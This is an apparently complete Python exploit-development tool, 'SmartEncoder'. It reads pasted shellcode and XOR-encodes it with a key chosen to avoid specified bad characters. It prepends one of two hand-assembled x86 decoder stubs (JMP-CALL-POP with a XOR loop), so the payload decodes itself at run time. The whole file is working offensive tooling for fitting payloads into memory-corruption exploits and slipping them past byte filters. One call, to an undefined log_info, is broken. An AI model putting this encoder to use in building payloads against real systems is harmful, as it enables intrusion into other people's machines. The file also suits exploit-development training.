#!/usr/bin/env python3
import ast
import sys
import random
import struct
import textwrap
import binascii
import argparse

BAD_CHARS = b''
ALLOWED_CHARS = bytearray()


def xor_byte_resolves(xor_byte, byte_list):
    global BAD_CHARS

    for item in byte_list:
        result = xor_byte ^ item
        if result in BAD_CHARS:
            return False

    return True


def get_resolved_xor_byte(byte_list):
    global ALLOWED_CHARS

    for xor_byte in ALLOWED_CHARS:
        if xor_byte_resolves(xor_byte, byte_list):
            return xor_byte

    return None


def get_xor_key(shellcode_tuple):
    packed_dwords = []
    for dword in shellcode_tuple:
        packed_dwords.append(struct.pack('<I', dword))

    final_xor_key = bytearray()
    for index in range(0, 4):
        byte_list = bytearray()

        for packed_dword in packed_dwords:
            byte_list += bytearray(packed_dword[index].to_bytes(length=1, byteorder='big'))

        resolved_xor_byte = get_resolved_xor_byte(byte_list)

        if resolved_xor_byte == None:
            return None

        final_xor_key += bytearray(resolved_xor_byte.to_bytes(length=1, byteorder='big'))

    return struct.unpack('<I', bytes(final_xor_key))[0]


def init_allowed_chars(bad_chars):
    global ALLOWED_CHARS

    ALLOWED_CHARS = bytearray()

    for i in range(0, 0xff+1):
        if i not in bad_chars:
            ALLOWED_CHARS += bytearray(i.to_bytes(length=1, byteorder='big'))

    if len(ALLOWED_CHARS) == 0:
        raise Exception('All bytes are bad chars')


def parse_badchars(badchars_str):
    try:
        bad_chars_tmp = ast.literal_eval("b'{0}'".format(badchars_str))
        return bytes(set(bad_chars_tmp))
    except Exception as e:
        print(e)
        pass

    raise Exception('Unable to parse bad chars: {0}'.format(badchars_str))


def bytes_to_hex_escaped(data_bytes):
    hex_str = binascii.hexlify(data_bytes, sep=' ')
    return ''.join(list(map(lambda x: '\\x{0}'.format(x), hex_str.decode().split(' '))))


def normalize_line(line):
    line = line.strip().rstrip(';')
    i = line.find('=')
    if i != -1:
        line = line[i+1:].strip()

    line = line.replace('bytearray', ' ').strip()
    line = line.replace('(', ' ').replace(')', ' ').strip()

    if line.startswith('b"'):
        line = line[2:].strip()

    if line.startswith("b'"):
        line = line[2:].strip()

    line = line.strip('"').strip("'")
    line = line.replace('0x', ' ').strip().replace(',', ' ').strip()
    line = line.replace('\\x', ' ').strip()
    return line

def normalize_input(contents):
    new_contents = ''
    contents = contents.replace('\r', ' ')
    for line in contents.split('\n'):
        new_contents += ' ' + normalize_line(line)

    new_contents = new_contents.strip()
    if not new_contents:
        return None

    if ' ' not in new_contents:
        # probably received a string in the hex form aabbccddeeff
        if len(contents) % 2 != 0:
            print('Odd number of chars. Are you sure you pasted the right shellcode?')
            return None

    else:
        splitted = new_contents.split()
        new_contents = ''
        for item in splitted:
            if len(item) == 1:
                item = '0{0}'.format(item)

            elif len(item) > 2:
                print('Could not identify your shellcode properly')
                return None

            new_contents += ' ' + item

        new_contents = new_contents.strip()
        return new_contents


def shellcode_contains_badchar(shellcode):
    global BAD_CHARS

    bad_chars_found = []

    for badchar in BAD_CHARS:
        if badchar in shellcode:
            bad_chars_found.append(badchar)

    if bad_chars_found != []:
        print('[!] Badchars found: {0}'.format(bytes_to_hex_escaped(bytes(bytearray(bad_chars_found)))))

    return bad_chars_found != []

def xor_encoder2(shellcode):
    xor_decoder = bytearray(
        b"\xbeXOR_KEY"               # mov    esi,0xaabbccdd
        b"\xeb\x0f"                  # jmp    16 <get_eip_start>
        b"\x5b"                      # pop    ebx
        b"\x31\xc0"                  # xor    eax,eax
        b"MOV_EAX_LEN"               # mov    al,0x4
        b"\x91"                      # xchg   ecx,eax
        b"\x31\x33"                  # xor    DWORD PTR [ebx],esi
        b"\x83\xeb\xfc"              # sub    ebx,0xfffffffc
        b"\xe2\xf9"                  # loop   d <decode_routine>
        b"\xeb\x05"                  # jmp    1b <shellcode>
        b"\xe8\xec\xff\xff\xff"      # call   7 <get_eip_finish>
    )

    xor_decoder = bytes(xor_decoder)

    shellcode_len = len(shellcode)

    iterator_length = shellcode_len // 4
    config_iterator_instruction = None

    if iterator_length <= 0xff:
        config_iterator_instruction = b'\xb0' + struct.pack('<B', iterator_length)

    elif iterator_length <= 0xffff:
        config_iterator_instruction = b'\x66\xb8' + struct.pack('<H', iterator_length)

    elif iterator_length <= 0xffffffff:
        config_iterator_instruction = b'\xb8' + struct.pack('<I', iterator_length)

    else:
        raise Exception('Unknown iterator_length')

    xor_decoder = xor_decoder.replace(b'MOV_EAX_LEN', config_iterator_instruction)

    if shellcode_contains_badchar(xor_decoder.replace(b'XOR_KEY', b'')):
        print('[!] Unable to create a XOR-encoded payload because the decoding routine contains a badchar.')
        return None

    shellcode_tuple = struct.unpack('<' + 'I' * (shellcode_len // 4), shellcode)

    print('[+] Trying to find a proper XOR key...')
    xor_key = get_xor_key(shellcode_tuple)

    if xor_key == None:
        print('[-] Unable to find a suitable XOR key.')
        return None

    encrypted_shellcode = b''
    for dword in shellcode_tuple:
        encrypted_shellcode += struct.pack('<I', dword ^ xor_key)

    if shellcode_contains_badchar(encrypted_shellcode):
        print('[!] Unable to create a XOR-encoded payload.')
        return None

    final_shellcode = xor_decoder.replace(b'XOR_KEY', struct.pack('<I', xor_key)) + encrypted_shellcode

    if shellcode_contains_badchar(final_shellcode):
        print('[!] Unknown error made the final shellcode contain a badchar')
        return None

    return final_shellcode

def xor_encoder(shellcode):
    xor_decoder = bytearray(
        b"\xbfXOR_KEY"               # mov    edi,0xaabbccdd           # where 0xaabbccdd is the XOR key
        b"\xeb\x0e"                  # jmp    15 <get_eip_start>
        b"\x5a"                      # pop    edx
        b"\x31\xc9"                  # xor    ecx,ecx
        b"MOV_ECX_LEN"               # mov    cl,0x4                   # where 0x4 is len(shellcode) // 4
        b"\x31\x3a"                  # xor    DWORD PTR [edx],edi
        b"\x83\xea\xfc"              # sub    edx,0xfffffffc
        b"\xe2\xf9"                  # loop   c <decode_routine>
        b"\xeb\x05"                  # jmp    1a <shellcode>
        b"\xe8\xed\xff\xff\xff"      # call   7 <get_eip_finish>
    )

    xor_decoder = bytes(xor_decoder)

    shellcode_len = len(shellcode)

    iterator_length = shellcode_len // 4
    config_iterator_instruction = None

    if iterator_length <= 0xff:
        config_iterator_instruction = b'\xb1' + struct.pack('<B', iterator_length)

    elif iterator_length <= 0xffff:
        config_iterator_instruction = b'\x66\xb9' + struct.pack('<H', iterator_length)

    elif iterator_length <= 0xffffffff:
        config_iterator_instruction = b'\xb9' + struct.pack('<I', iterator_length)

    else:
        raise Exception('Unknown iterator_length')

    xor_decoder = xor_decoder.replace(b'MOV_ECX_LEN', config_iterator_instruction)

    if shellcode_contains_badchar(xor_decoder.replace(b'XOR_KEY', b'')):
        print('[!] Unable to create a XOR-encoded payload because the decoding routine contains a badchar.')
        return None

    shellcode_tuple = struct.unpack('<' + 'I' * (shellcode_len // 4), shellcode)

    print('[+] Trying to find a proper XOR key...')
    xor_key = get_xor_key(shellcode_tuple)

    if xor_key == None:
        print('[-] Unable to find a suitable XOR key.')
        return None

    encrypted_shellcode = b''
    for dword in shellcode_tuple:
        encrypted_shellcode += struct.pack('<I', dword ^ xor_key)

    if shellcode_contains_badchar(encrypted_shellcode):
        print('[!] Unable to create a XOR-encoded payload.')
        return None

    final_shellcode = xor_decoder.replace(b'XOR_KEY', struct.pack('<I', xor_key)) + encrypted_shellcode

    if shellcode_contains_badchar(final_shellcode):
        print('[!] Unknown error made the final shellcode contain a badchar')
        return None

    return final_shellcode

def multi_encoder(original_shellcode):
    padding_size = 4 - (len(original_shellcode) % 4)
    padded_shellcode = original_shellcode + b'\x90' * padding_size

    encoded_shellcodes = []

    xor_encoded = xor_encoder(padded_shellcode)
    
    if xor_encoded:
        encoded_shellcodes.append({'encoder': 'XOR1', 'shellcode': xor_encoded})

    xor_encoded2 = xor_encoder2(padded_shellcode)

    if xor_encoded2:
        encoded_shellcodes.append({'encoder': 'XOR2', 'shellcode': xor_encoded2})

    return encoded_shellcodes


def main():
    global ALLOWED_CHARS
    global BAD_CHARS

    parser = argparse.ArgumentParser(description='SmartEncoder arguments')
    parser.add_argument('--bad-chars', help="Bytes to avoid in gadget addresses. Example: --bad-chars='\\x00\\x0d\\x0a'", type=str)

    args = parser.parse_args()
    bad_chars = b''

    if args.bad_chars:
        bad_chars = parse_badchars(args.bad_chars)

        if args.bad_chars.startswith('x'):
            print('[!] Have you specified the bad chars inside single quotes?')
            print('[!] These are the bad chars I understood you specified: {0}'.format(bytes_to_hex_escaped(bad_chars)))
            answer = input('[?] Is this correct? [y/N]: ')

            if answer.upper() != 'Y':
                log_info("[!] Try to specify bad chars inside single quotes. Example: --bad-chars='\\x00\\xff'")
                return 1

    init_allowed_chars(bad_chars)

    BAD_CHARS = bad_chars
    
    print('[+] Paste your shellcode below and then press CTRL+d:\n')
    original_shellcode = sys.stdin.read()
    original_shellcode = normalize_input(original_shellcode)

    try:
        print('\n\n[+] Processing the following shellcode:')
        print('{0}\n'.format(' '.join(textwrap.wrap(original_shellcode, 2))))

        original_shellcode = bytes.fromhex(original_shellcode)
        print('\nShellcode size: {0} bytes'.format(len(original_shellcode)))
        
    except Exception as e:
        print('[!] Something went wrong while decoding your shellcode.')
        print(e)
        return 1

    if bad_chars:
        print('[+] Avoiding badchars: {0}\n\n'.format(bytes_to_hex_escaped(bad_chars)))


    encoded_shellcodes = multi_encoder(original_shellcode)

    if not encoded_shellcodes:
        print('Unable to encode shellcode avoiding badchars')
        return 1

    for item in encoded_shellcodes:
        encoder = item.get('encoder')
        encoded_shellcode = item.get('shellcode')

        print('\n[+] {0}-encoded shellcode ({1} bytes):\n{2}\n\n'.format(encoder, len(encoded_shellcode), bytes_to_hex_escaped(encoded_shellcode)))


    return 0


if __name__ == '__main__':
    ret = main()
    sys.exit(ret)
